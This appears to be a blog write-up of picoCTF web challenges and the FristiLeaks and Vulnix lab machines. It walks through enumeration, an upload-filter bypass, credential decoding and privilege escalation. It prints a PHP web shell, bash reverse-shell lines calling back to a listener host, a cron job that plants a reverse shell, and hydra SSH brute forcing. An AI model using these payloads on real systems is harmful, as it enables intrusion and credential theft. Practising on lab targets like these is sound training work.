---
title: 'CFSS'
date: 2024-08-26T22:39:10+01:00
---




## Challenge 1.


We are given this challenge 



![](https://i.imgur.com/nSP2Uc5.png)



Using curl we can see the  that we need to make a POST request together with the username and password parameter


```bash
❯ curl http://165.227.106.113/post.php
<h1>This site takes POST data that you have not submitted!</h1><!-- username: admin | password: 71urlkufpsdnlkadsf --> 
```


We can then use curl again this time specifying the `-X` flag for POST request and `-d` for data

```bash
❯ curl http://165.227.106.113/post.php -X POST -d username=admin -d password=71urlkufpsdnlkadsf
<h1>flag{p0st_d4t4_4ll_d4y}</h1>
```



## Challenge 2.


We are given the following challenge

![](https://i.imgur.com/o70t1hn.png)


First of all we make a request with curl and we can see that we have a user agent problem specifying the user agent to be used in comment, `Sup3rS3cr3tAg3nt`.


```bash
❯ curl http://165.227.106.113/header.php
Sorry, it seems as if your user agent is not correct, in order to access this website. The one you supplied is: curl/8.6.0
<!-- Sup3rS3cr3tAg3nt  -->
```

Using the specified user agent with the `-A` flag we have another error saying we need to come form [awesomesauce.com](awesomesauce.com)

```bash
❯ curl http://165.227.106.113/header.php -A Sup3rS3cr3tAg3nt
Sorry, it seems as if you did not just come from the site, "awesomesauce.com".
<!-- Sup3rS3cr3tAg3nt  -->
```

We can specify the [awesomesauce.com](awesomesauce.com) website by using the `--referer` option.

```bash
❯ curl http://165.227.106.113/header.php -A Sup3rS3cr3tAg3nt --referer awesomesauce.com
Here is your flag: flag{did_this_m3ss_with_y0ur_h34d}
<!-- Sup3rS3cr3tAg3nt  -->
```


## Challenge 3.

We are given the following challenge 


![](https://i.imgur.com/kQPtC9W.png)



- Viewing source code i couldn't find any password.
- However there is something wrong about the URL as navigating to `/where-am-i` redirects me to `/where-am-i?getoutofhere`.
- Decided to use burp to analyze this and found the password.


![](https://i.imgur.com/qqZgTam.png)


We submitted the password and we have this page

![](https://i.imgur.com/HCg2nM2.png)



## Challenge 4.

We are given the following challenge : 


![](https://i.imgur.com/vCqe3YS.png)


We just need a little bit of research skills here, which led me to this.


![](https://i.imgur.com/SLKnuKa.png)

As requested we can go ahead and submit flag format as ; `picoCTF{CVE-2021-34527}`.

![](https://i.imgur.com/eoaCzzM.png)



## Challenge 5.

We are given the following challenge

![](https://i.imgur.com/zzK5eKo.png)


Navigating to the website we have an upload function saying we should upload 2 files.

![](https://i.imgur.com/eza7Kvz.png)

I started by uploading 2 PDF files which are the same, as the website only accepts PDF file types. This gave me an error saying we must upload 2 different PDF files. 


![](https://i.imgur.com/KCect1I.png)


....Then i get another error saying ***"MD5 hashes do not match"***, This made me understand that different files are judged by one MD5 hash, weird!!


![](https://i.imgur.com/o6OXfrX.png)

Started to look up google and ended up with the search term "***What is a MD5 collision attack?***" 

![](https://i.imgur.com/KZQKWZe.png)


This led me to this [GitHub](https://github.com/corkami/collisions/tree/master/examples/free) respository with 2 files each which has the same MD5. we can download the following files as shown in the below screenshot.



![](https://i.imgur.com/uLWkETL.png)


Uploading this 2 files we got the following flag and bypassed the filter in place.


![](https://i.imgur.com/cR58ubA.png)


## Challenge 6.

We are given the following challenge :


![](https://i.imgur.com/tUPfydV.png)


I made a curl request to the default web page as usual and got the following page, in summary asking ***"where are the robots?"***.

```bash
❯ curl http://jupiter.challenges.picoctf.org:60915/
<!doctype html>
<html>
  <head>
    <title>Welcome</title>
    <link href="https://fonts.googleapis.com/css?family=Monoton|Roboto" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="style.css">
  </head>

  <body>
    <div class="container">
      <header>
	<h1>Welcome</h1>
      </header>
      <div class="content">
	<p>Where are the robots?</p>
      </div>
      <footer></footer>
    </div>
  </body>
</html>
```

Since by default `robots` are stored at `/robots.txt` which _tells search engine crawlers which URLs the crawler can access on your site_. We can go ahead and make a curl request to the endpoint.

```bash
❯ curl http://jupiter.challenges.picoctf.org:60915/robots.txt
User-agent: *
Disallow: /8028f.html
```

This shows that there is a `/8028f.html` endpoint in which we can go ahead and make another curl request to, giving us our flag.

```bash
❯ curl http://jupiter.challenges.picoctf.org:60915/8028f.html
<!doctype html>
<html>
  <head>
    <title>Where are the robots</title>
    <link href="https://fonts.googleapis.com/css?family=Monoton|Roboto" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="style.css">
  </head>
  <body>
    <div class="container">
      
      <div class="content">
	<p>Guess you found the robots<br />
	  <flag>picoCTF{ca1cu1at1ng_Mach1n3s_8028f}</flag></p>
      </div>
      <footer></footer>
  </body>
</html>
```

Go ahead and submit the flag 

![](https://i.imgur.com/ttiNSw8.png)


## Challenge 7 - FristiLeaks: 1.3


#### About:

```
Name: Fristileaks 1.3
Author: Ar0xA
Series: Fristileaks
Style: Enumeration/Follow the breadcrumbs
Goal: get root (uid 0) and read the flag file
Tester(s): dqi, barrebas
Difficulty: Basic
```

#### Description:

```
A small VM made for a Dutch informal hacker meetup called Fristileaks. Meant to be broken in a few hours without requiring debuggers, reverse engineering, etc..
```


#### Instruction:

```
VMware users will need to manually edit the VM's MAC address to: 08:00:27:A5:A6:76
```




We start by running a network scan using the `arp-scan` utility.


```bash
❯ sudo arp-scan -l
Interface: wlan0, type: EN10MB, MAC: 1c:4d:70:2c:34:13, IPv4: 192.168.0.158
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.0.1     98:a9:42:2c:e9:d3       Guangzhou Tozed Kangwei Intelligent Technology Co., LTD
192.168.0.134   1c:4d:70:2c:34:13       Intel Corporate

2 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.068 seconds (123.79 hosts/sec). 2 responded
```


Then running an nmap scan we have


```bash
# Nmap 7.94SVN scan initiated Sun Aug 25 11:13:17 2024 as: nmap -p- -T4 -v --min-rate=1000 -sCV -oN nmap.txt 192.168.0.134
Nmap scan report for 192.168.0.134
Host is up (0.00046s latency).
Not shown: 65409 filtered tcp ports (no-response), 125 filtered tcp ports (host-unreach)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|   Supported Methods: GET HEAD POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
| http-robots.txt: 3 disallowed entries 
|_/cola /sisi /beer

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Aug 25 11:15:25 2024 -- 1 IP address (1 host up) scanned in 127.54 seconds
```



Using curl to check for existence of `/robots.txt` we have


```bash
❯ curl http://192.168.0.134/robots.txt
User-agent: *
Disallow: /cola
Disallow: /sisi
Disallow: /beer
```



This 3 directories provides us with the same image which after analysis has nothing to show at all


![](https://i.imgur.com/2qUqv0k.png)


I also tried to fuzz through this discovered endpoints, but nothing also, then i decided to guess the directories trying `/fristileaks` first and `/fristi` which gave us this admin portal


![](https://i.imgur.com/NirOTbU.png)


I tried admin default credentials including SQLi attacks but to no avail so i decided to view source code

1. Found out that a user called `eezeepz` has stored junk base64 data in this source code

![](https://i.imgur.com/O45MCkM.png)

2. Scrolling down i found the base64 encoded message and since as instructed it is an image we will try and do `base642png` for this scenario.


![](https://i.imgur.com/dRhmk9i.png)



Then browsed to this [website](https://base64.guru/converter/decode/image/png) and indeed we have a base64 decoded image, waiting for us. 


![](https://i.imgur.com/zHdoPNr.png)


I thought that this was the password to the `eezeepz` user and as much as i thought, yes it is cos i was able to login with password `keKkeKKeKKeKkEkkEk` and got a upload page


![](https://i.imgur.com/pUyTlMw.png)


After several trial and error i was able to upload the below content with file name as `rev.php.png`


```PHP
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```

Then accessing the file on the `/uploads` directory we have a web shell, hehe


![](https://i.imgur.com/2lJzuEt.png)


You can then attempt to gain a reverse shell with the below payload;

```bash
# Start up listener
nc -lvnp 4444

# Inject payload into the webshell for reverse shell
/bin/bash -i >& /dev/tcp/192.168.0.158/4444 0>&1

####################################################################
####################################################################

# Popped reverse shell
❯ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.0.158] from (UNKNOWN) [192.168.0.134] 34811
bash: no job control in this shell
bash-4.1$ whoami
whoami
apache
bash-4.1$
```



Then i found a `notes.txt` file under `/var/www` which says this


```bash
bash-4.1$ cat /var/www/notes.txt 
hey eezeepz your homedir is a mess, go clean it up, just dont delete
the important stuff.

-jerry
```


Checking the user `eezeepz` i also found another `notes.txt` file


```bash
bash-4.1$ cat notes.txt 
Yo EZ,

I made it possible for you to do some automated checks, 
but I did only allow you access to /usr/bin/* system binaries. I did
however copy a few extra often needed commands to my 
homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
from /home/admin/

Don't forget to specify the full path for each binary!

Just put a file called "runthis" in /tmp/, each line one command. The 
output goes to the file "cronresult" in /tmp/. It should 
run every minute with my account privileges.

- Jerry
bash-4.1$ pwd
/home/eezeepz
bash-4.1$
```


> The above statement in summary says there is a cronjob running as an unknown user at `/tmp` with an editable file names `runthis`, that unknown user only has access to run binary files under the `/home/admin/`  directory respectively, this binaries have been specified.


We then need to pick from this binaries for example the `chmod`  command to change modifications of the path probably `/home/admin` which we don't have access to

```bash
bash-4.1$ ls /home/admin
ls: cannot open directory /home/admin: Permission denied
bash-4.1$ nano /tmp/runthis
bash-4.1$ cat /tmp/runthis
#!/bin/bash

/home/admin/chmod 777 /home/admin -R
bash-4.1$ 
```



After 1 minute checking the permissions of the `/home/admin` directory we now have full RWX access


```bash
bash-4.1$ ls -ld /home/admin
drwxrwxrwx. 2 admin admin 4096 Nov 19  2015 /home/admin
bash-4.1$ cd /home/admin
bash-4.1$ pwd
/home/admin
bash-4.1$ ls
cat    cronjob.py       cryptpass.py  echo   grep  whoisyourgodnow.txt
chmod  cryptedpass.txt  df            egrep  ps
bash-4.1$ 
```

We can then attempt to gain a reverse shell as the unknown user by adding `bash` binary to `/home/admin` and then editing the `/tmp/runthis` file with our reverse shell payload, leaving us with a shell as `admin` as seen below.

```bash
bash-4.1$ cp /bin/bash ./
bash-4.1$ chmod 777 bash
bash-4.1$ nano /tmp/runthis 
bash-4.1$ cat /tmp/runthis 
#!/bin/bash

/home/admin/chmod 777 /home/admin -R
/home/admin/bash -i >& /dev/tcp/192.168.0.158/1337 0>&1
bash-4.1$ 

####################################################################
####################################################################

# Wait for reverse shell
❯ nc -lvnp 1337
listening on [any] 1337 ...
connect to [192.168.0.158] from (UNKNOWN) [192.168.0.134] 42273
bash: no job control in this shell
[admin@localhost ~]$ whoami
whoami
admin
```

Now the problem is even if you get a reverse shell, you still have some files that we need to figure out. like the `cryptedpass.txt`, `cryptpass.txt` and `whoisyourgodnow.txt` files.

```bash
bash-4.1$ ls -la
total 1548
drwxrwxrwx. 2 admin     admin       4096 Aug 25 09:15 .
drwxr-xr-x. 5 root      root        4096 Nov 19  2015 ..
-rwxrwxrwx  1 admin     admin        129 Aug 25 09:25 .bash_history
-rwxrwxrwx. 1 admin     admin         18 Sep 22  2015 .bash_logout
-rwxrwxrwx. 1 admin     admin        176 Sep 22  2015 .bash_profile
-rwxrwxrwx. 1 admin     admin        124 Sep 22  2015 .bashrc
-rwxrwxrwx  1 apache    apache    906152 Aug 25 09:07 bash
-rwxrwxrwx  1 admin     admin      45224 Nov 18  2015 cat
-rwxrwxrwx  1 admin     admin      48712 Nov 18  2015 chmod
-rwxrwxrwx  1 admin     admin        737 Nov 18  2015 cronjob.py
-rwxrwxrwx  1 admin     admin         21 Nov 18  2015 cryptedpass.txt
-rwxrwxrwx  1 admin     admin        258 Nov 18  2015 cryptpass.py
-rwxrwxrwx  1 admin     admin      90544 Nov 18  2015 df
-rwxrwxrwx  1 admin     admin      24136 Nov 18  2015 echo
-rwxrwxrwx  1 admin     admin     163600 Nov 18  2015 egrep
-rwxrwxrwx  1 admin     admin     163600 Nov 18  2015 grep
-rwxrwxrwx  1 admin     admin      85304 Nov 18  2015 ps
-rwxrwxrwx  1 admin     admin       2354 Aug 25 09:15 typescript
-rw-r--r--  1 fristigod fristigod     25 Nov 19  2015 whoisyourgodnow.txt
```

The script `cryptpass.py` is designed to take a string input, encode it with `base64`, reverse the string, apply `ROT13`, and then print the result.


```bash
[admin@localhost ~]$ cat cryptedpass.txt 
mVGZ3O3omkJLmy2pcuTq
[admin@localhost ~]$ cat cryptpass.py 
#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
import base64,codecs,sys

def encodeString(str):
    base64string= base64.b64encode(str)
    return codecs.encode(base64string[::-1], 'rot13')

cryptoResult=encodeString(sys.argv[1])
print cryptoResult
```


#### Reverse Engineering Steps:

1. **Reverse ROT13**: Since ROT13 is symmetric, apply ROT13 again to decode it.
2. **Reverse the String**: Reverse the ROT13-decoded string to get the original base64 string.
3. **Base64 Decode**: Decode the reversed string from base64 to get the original plaintext.


The below script did the work for me TBH, using chatgpt assistance 

```python
import base64, codecs

def decodeString(encoded_str):
    # Step 1: Apply ROT13 again to decode
    rot13_decoded = codecs.encode(encoded_str, 'rot13')
    
    # Step 2: Reverse the string
    reversed_string = rot13_decoded[::-1]
    
    # Step 3: Decode from base64
    original_string = base64.b64decode(reversed_string)
    
    return original_string

# Example usage
encoded_str = "mVGZ3O3omkJLmy2pcuTq"
original_str = decodeString(encoded_str)
print(original_str.decode('utf-8'))  # Decode from bytes to string if needed
```

Then tried the script for both files and we have clear text password for both user `admin` and `fristigod`

```bash
#cryptpass.txt
❯ python3 exploit.py
thisisalsopw123

#whoisyourgodnow.txt
❯ python3 exploit.py
LetThereBeFristi! 
```

You can also do this with **cyberchef**, however i have crafted the recipe so just follow through this [link](https://cyberchef.io/#recipe=ROT13(true,true,false,13)Reverse('Character')From_Base64('A-Za-z0-9%2B/%3D',true)&input=PVJGbjBBS25sTUhNUEl6cHl1VEkwSVRH)

Then switched user to `fristigod` since we don't have access to this user's home folder yet with the cracked password.


```bash
bash-4.1$ su fristigod
Password: 
bash-4.1$ whoami
fristigod
bash-4.1$ 
```

Checking sudo privileges we have permission to run a file called `doCom` at `/var/fristigod/.secret_admin_stuff/` as user `fristigod`

```bash
bash-4.1$ sudo -l
Matching Defaults entries for fristigod on this host:
    requiretty, !visiblepw, always_set_home, env_reset, env_keep="COLORS
    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1
    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL
    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User fristigod may run the following commands on this host:
    (fristi : ALL) /var/fristigod/.secret_admin_stuff/doCom
bash-4.1$ 
```


However upon running this the right way i have the following error.

```bash
bash-4.1$ sudo -u fristigod /var/fristigod/.secret_admin_stuff/doCom
Sorry, user fristigod is not allowed to execute '/var/fristigod/.secret_admin_stuff/doCom' as fristigod on localhost.localdomain.
```

Navigating to `/var/fristigod` i have a `.bash_history` file there  


```bash
bash-4.1$ pwd
/var/fristigod
bash-4.1$ ls -la
total 16
drwxr-x---   3 fristigod fristigod 4096 Nov 25  2015 .
drwxr-xr-x. 19 root      root      4096 Nov 19  2015 ..
-rw-------   1 fristigod fristigod  900 Aug 25 09:42 .bash_history
drwxrwxr-x.  2 fristigod fristigod 4096 Nov 25  2015 .secret_admin_stuff
```

Reading this file i understood more how this command worked 🤣, we need to specify a command next to the actual command.

```bash
bash-4.1$ cat .bash_history 
ls
pwd
ls -lah
cd .secret_admin_stuff/
ls
./doCom 
./doCom test
sudo ls
exit
cd .secret_admin_stuff/
ls
./doCom 
sudo -u fristi ./doCom ls /
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
exit
--SNIP--
bash-4.1$ 

```

So i decided to run the `whoami` command and we got a response as user `root`


```bash
bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom whoami
[sudo] password for fristigod: 
root
bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /root -la
total 48
dr-xr-x---.  3 root root 4096 Nov 25  2015 .
dr-xr-xr-x. 22 root root 4096 Aug 25 08:51 ..
-rw-------   1 root root 1936 Nov 25  2015 .bash_history
-rw-r--r--.  1 root root   18 May 20  2009 .bash_logout
-rw-r--r--.  1 root root  176 May 20  2009 .bash_profile
-rw-r--r--.  1 root root  176 Sep 22  2004 .bashrc
drwxr-xr-x.  3 root root 4096 Nov 25  2015 .c
-rw-r--r--.  1 root root  100 Sep 22  2004 .cshrc
-rw-------.  1 root root 1291 Nov 17  2015 .mysql_history
-rw-r--r--.  1 root root  129 Dec  3  2004 .tcshrc
-rw-------.  1 root root  829 Nov 17  2015 .viminfo
-rw-------.  1 root root  246 Nov 17  2015 fristileaks_secrets.txt
bash-4.1$ 
```

Spawning a shell as the `root` user would be as simple as doing this


```bash
bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom bash
bash-4.1# whoami
root
bash-4.1# cd /root
bash-4.1# ls
fristileaks_secrets.txt
bash-4.1# cat fristileaks_secrets.txt
Congratulations on beating FristiLeaks 1.0 by Ar0xA [https://tldr.nu]

I wonder if you beat it in the maximum 4 hours it's supposed to take!

Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)


Flag: Y0u_kn0w_y0u_l0ve_fr1st1


bash-4.1# 
```


> Please Take note that when stabilizing shells `python2` should be use.


## Challenge 8 - HackLAB: Vulnix


#### Description:


```
Here we have a vulnerable Linux host with configuration weaknesses rather than purposely vulnerable software versions (well at the time of release anyway!)

The host is based upon Ubuntu Server 12.04 and is fully patched as of early September 2012. The details are as follows:

- Architecture: x86
- Format: VMware (vmx & vmdk) compatibility with version 4 onwards
- RAM: 512MB
- Network: NAT
- Extracted size: 820MB
- Compressed (download size): 194MB – 7zip format – 7zip can be obtained from here
- MD5 Hash of Vulnix.7z: 0bf19d11836f72d22f30bf52cd585757    

The goal; boot up, find the IP, hack away and obtain the trophy hidden away in /root by any means you wish – excluding the actual hacking of the vmdk

Free free to contact me with any questions/comments using the comments section below.

Enjoy!
```



Running the `arp-scan` utility we have the following result of our target host.



```bash
❯ sudo arp-scan -l                                                                             
[sudo] password for sec-fortress:                                                              
Interface: wlan0, type: EN10MB, MAC: 1c:4d:70:2c:34:13, IPv4: 192.168.0.158
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.0.1     98:a9:42:2c:e9:d3       Guangzhou Tozed Kangwei Intelligent Technology Co., LTD 
192.168.0.131   1c:4d:70:2c:34:13       Intel Corporate

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.057 seconds (124.45 hosts/sec). 2 responded
```



Running our nmap scan we have :



```bash
# Nmap 7.94SVN scan initiated Sun Aug 25 14:18:08 2024 as: nmap -p- -T4 -v --min-rate=1000 -sCV -oN nmap.txt 192.168.0.131
Nmap scan report for vulnix (192.168.0.131)
Host is up (0.0020s latency).
Not shown: 65518 closed tcp ports (conn-refused)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 10:cd:9e:a0:e4:e0:30:24:3e:bd:67:5f:75:4a:33:bf (DSA)
|   2048 bc:f9:24:07:2f:cb:76:80:0d:27:a6:48:52:0a:24:3a (RSA)
|_  256 4d:bb:4a:c1:18:e8:da:d1:82:6f:58:52:9c:ee:34:5f (ECDSA)
25/tcp    open  smtp       Postfix smtpd
| ssl-cert: Subject: commonName=vulnix
| Issuer: commonName=vulnix
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2012-09-02T17:40:12
| Not valid after:  2022-08-31T17:40:12
| MD5:   58e3:f1ac:fef6:b6d1:744c:836f:ba24:4f0a
|_SHA-1: 712f:69ba:8c54:32e5:711c:898b:55ab:0a83:44a0:420b
|_smtp-commands: vulnix, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
|_ssl-date: 2024-08-25T13:21:20+00:00; +3s from scanner time.
79/tcp    open  finger     Linux fingerd
|_finger: No one logged on.\x0D
110/tcp   open  pop3?
|_pop3-capabilities: PIPELINING CAPA TOP STLS SASL RESP-CODES UIDL
| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
| Issuer: commonName=vulnix/organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2012-09-02T17:40:22
| Not valid after:  2022-09-02T17:40:22
| MD5:   2b3f:3e28:c85d:e10c:7b7a:2435:c5e7:84fc
|_SHA-1: 4a49:a407:01f1:37c8:81a3:4519:981b:1eee:6856:348e
|_ssl-date: 2024-08-25T13:21:20+00:00; +3s from scanner time.
111/tcp   open  rpcbind    2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      33717/udp   mountd
|   100005  1,2,3      44535/tcp6  mountd
|   100005  1,2,3      50944/udp6  mountd
|   100005  1,2,3      53510/tcp   mountd
|   100021  1,3,4      43297/udp6  nlockmgr
|   100021  1,3,4      43584/udp   nlockmgr
|   100021  1,3,4      58082/tcp6  nlockmgr
|   100021  1,3,4      58548/tcp   nlockmgr
|   100024  1          44406/tcp6  status
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
143/tcp   open  imap       Dovecot imapd
| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
| Issuer: commonName=vulnix/organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2012-09-02T17:40:22
| Not valid after:  2022-09-02T17:40:22
| MD5:   2b3f:3e28:c85d:e10c:7b7a:2435:c5e7:84fc
|_SHA-1: 4a49:a407:01f1:37c8:81a3:4519:981b:1eee:6856:348e
|_imap-capabilities: more have STARTTLS ENABLE listed post-login capabilities IMAP4rev1 LITERAL+ LOGINDISABLEDA0001 LOGIN-REFERRALS OK Pre-login IDLE SASL-IR ID
|_ssl-date: 2024-08-25T13:21:20+00:00; +3s from scanner time.
512/tcp   open  exec?
513/tcp   open  login
514/tcp   open  tcpwrapped
993/tcp   open  ssl/imap   Dovecot imapd
|_ssl-date: 2024-08-25T13:21:19+00:00; +2s from scanner time.
|_imap-capabilities: more have ENABLE listed post-login capabilities IMAP4rev1 LITERAL+ ID SASL-IR OK Pre-login IDLE AUTH=PLAINA0001 LOGIN-REFERRALS
| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
| Issuer: commonName=vulnix/organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2012-09-02T17:40:22
| Not valid after:  2022-09-02T17:40:22
| MD5:   2b3f:3e28:c85d:e10c:7b7a:2435:c5e7:84fc
|_SHA-1: 4a49:a407:01f1:37c8:81a3:4519:981b:1eee:6856:348e
995/tcp   open  ssl/pop3s?
|_ssl-date: 2024-08-25T13:21:20+00:00; +3s from scanner time.
|_pop3-capabilities: PIPELINING CAPA TOP USER SASL(PLAIN) RESP-CODES UIDL
| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
| Issuer: commonName=vulnix/organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2012-09-02T17:40:22
| Not valid after:  2022-09-02T17:40:22
| MD5:   2b3f:3e28:c85d:e10c:7b7a:2435:c5e7:84fc
|_SHA-1: 4a49:a407:01f1:37c8:81a3:4519:981b:1eee:6856:348e
2049/tcp  open  nfs        2-4 (RPC #100003)
41889/tcp open  status     1 (RPC #100024)
49007/tcp open  mountd     1-3 (RPC #100005)
53510/tcp open  mountd     1-3 (RPC #100005)
58548/tcp open  nlockmgr   1-4 (RPC #100021)
59542/tcp open  mountd     1-3 (RPC #100005)
Service Info: Host:  vulnix; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2s, deviation: 0s, median: 2s

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Aug 25 14:21:18 2024 -- 1 IP address (1 host up) scanned in 189.88 seconds
```



- Used the wordlist from [here](https://github.com/W-GOULD/ssh-user-enumeration) and the original tool from [here](https://github.com/nccgroup/ssh_user_enum) 


```bash
❯ python2 ssh_enum.py -u ../ssh-user-enumeration/wordlist.txt -i 192.168.0.131

Starting username enumeration
====================
User root took 17.0 seconds
User root exists
User admin took 1.0 seconds
User user took 18.0 seconds
User user exists
User test took 2.0 seconds
User guest took 2.0 seconds
User ubuntu took 2.0 seconds
User kali took 2.0 seconds
User john took 2.0 seconds
User jane took 2.0 seconds
User smith took 2.0 seconds


The following users were valid (settings were - multiplier of 20000 and a threshold of 14:
===========================
root
user
```

We can then attempt to brute force SSH with the username we have at hand. which was successful.

```bash
❯ hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://192.168.0.131 -v
--SNIP--
[22][ssh] host: 192.168.0.131   login: user   password: letmein
[STATUS] attack finished for 192.168.0.131 (waiting for children to complete tests)
[STATUS] 2049199.86 tries/min, 14344399 tries in 00:07h, 6 to do in 00:01h, 9 active
1 of 1 target successfully completed, 1 valid password found
```



Got the password and logged in via SSH as the user in which password was cracked for.


```bash
❯ ssh user@192.168.0.131
user@192.168.0.131's password: 
Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Sun Aug 25 21:57:25 BST 2024

  System load:  0.06             Processes:           95
  Usage of /:   90.2% of 773MB   Users logged in:     0
  Memory usage: 7%               IP address for eth0: 192.168.0.131
  Swap usage:   0%

  => / is using 90.2% of 773MB

  Graph this data and manage this system at https://landscape.canonical.com/

user@vulnix:~$ whoami
user
```

There is a way to privilege escalate by abusing the "***no_root_squash***" privileges on NFS but i think the machine has a problem and that would be all for now.

```bash
user@vulnix:/tmp$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/home/vulnix    *(rw,root_squash)
```
